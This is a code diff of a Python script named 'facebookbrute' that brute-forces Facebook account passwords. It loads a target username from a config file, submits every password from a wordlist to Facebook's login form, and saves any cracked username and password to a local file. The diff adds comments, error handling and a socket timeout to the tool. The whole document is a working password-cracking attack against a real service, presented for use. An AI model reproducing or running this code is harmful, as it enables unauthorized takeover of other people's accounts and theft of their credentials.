@@ -1,6 +1,12 @@
 #!/usr/bin/python
+##########################
 # Title: facebookbrute
 # Author: Th3J0k3r
+#
+##########################
+
+#
+# The modules that are needed.
 #
 import mechanize
 import time
@@ -12,6 +18,9 @@ from bs4 import BeautifulSoup
 from lazyme.string import color_print
 
 
+#
+# The banner.
+#
 def def_banner():
 
 	os.system('clear')
@@ -26,7 +35,9 @@ def def_banner():
 
 	color_print("			Created By Th3J0k3r", color='green')
 
+#
 # Read in the config file.
+#
 def def_config ():
 	
 	# Read in the config file
@@ -49,10 +60,13 @@ def def_config ():
 		def_setup()
 		def_process(def_login())
 
-# Setup the browser
+#
+# Setup the browser.
+#
 def def_setup():
+
 	# Set the socket timeout.
-	#mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 100
+	mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 100
 
 	# Setup Mechanize
 	global browser
@@ -64,6 +78,7 @@ def def_setup():
 	browser.set_handle_refresh(True)
 	browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 		
+	# Check the config file to see if debugging is turned on.
 	isDebugging = configParser.get('Config', 'debug')
 	if isDebugging == 'True':
 		# Want debugging messages?
@@ -71,35 +86,59 @@ def def_setup():
 		browser.set_debug_redirects(True)
 		browser.set_debug_responses(True)
 
-	url = 'http://www.facebook.com/login.php'
-	browser.open(url)
-	browser.select_form(nr = 0)
 
+	# Catch any URLErrors when opening the page.
+	url = 'http://www.facebook.com/login.php'
+	try:
+		browser.open(url)
+		browser.select_form(nr = 0)
+	except URLError as e:
+		color_print("Try resetting your network interface" + e)
+
+#
+# MultiProcessing to speed up the crack
+#
 def def_process (f):
 	p = Process(target=f)
 	p.start()
 
-# Crack the password.
+#
+# Attempt to login with multiple passwords
+#
 def def_login():
 
-	global request
 	# read in the username from the config file.
 	browser.form['email'] = configParser.get('Config', 'user')
 	
 	with open(dic_path) as fp:
 		line = fp.readline()
 	   	while line:
-
+	
+			# This is the current password in the dictionary 
+			# that we attempt to login with
+			#
 			password = format(line.strip())
-	      		color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')
 			browser.form['pass'] = str(password)
-			request = browser.submit()
+
+			# Print out the tries
+	      		color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')
+
+			# Try to Submit
+			try:
+ 				request = browser.submit()
+			except URLError as e:
+				color_print("Try resetting your network interface" + e)
+			
+
 			# Declare a BeautifulSoup Object.
 			soup = BeautifulSoup(request, 'html.parser')
+
+
 			# Attempt to brute force the password.
 			title = soup.title.string
 			if title != 'Facebook':
 
+				# PASSWORD NOT FOUND, DAMN!!
 				action = soup.find('form', id='login_form').get('action')
 				color_print(action, color='red')
 				print("[!] Wrong password")
@@ -109,9 +148,13 @@ def def_login():
 				continue	
 			else:
 
-				# Password found, Yey!!
+				# SUCCESS PASSWORD FOUND, YEY!!
 				username = configParser.get('Config', 'user')	
+
+				# Print out the credentials
 				color_print("Password Cracked - Username: " + username + " Password: " + password, color='green')
+
+				# Save the credentials to a file located in the passwords directory
 				color_print("[!] Saving credentials to passwords/" + username, color='blue')	
 				saveCreds = open('passwords/' + username + ".txt", 'w')
 				saveCreds.write(username + '\n')
@@ -121,7 +164,8 @@ def def_login():
 
 			browser.select_form(nr = 0)
 	       		line = fp.readline()
-			continue
+#
 # call the methods.
+#
 def_banner()
 def_config()
